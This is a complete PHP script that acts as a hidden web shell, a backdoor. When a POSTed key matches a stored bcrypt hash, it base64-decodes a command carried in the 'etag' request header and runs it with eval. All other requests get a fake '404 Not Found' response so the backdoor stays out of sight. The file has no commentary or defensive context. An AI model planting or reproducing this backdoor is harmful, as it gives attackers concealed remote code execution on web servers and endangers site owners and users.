<?php

if (isset($_POST['key'])){
	$stored_key='$2y$10$ecmnD4sNd/4Y5XOITeTcvOQlG.zzaZjV9vQTEEsTJEZYhsXeOoQh2';
	$key=($_POST['key']);
	if((password_verify($key,$stored_key)) == 1){
		$command=base64_decode((getallheaders()['etag']));
		print_r(@eval($command));
	}else{

		header("HTTP/1.0 404 Not Found");
		echo 'Error 404';

	}
	
}else{


		header("HTTP/1.0 404 Not Found");
		echo 'Error 404';


}

?>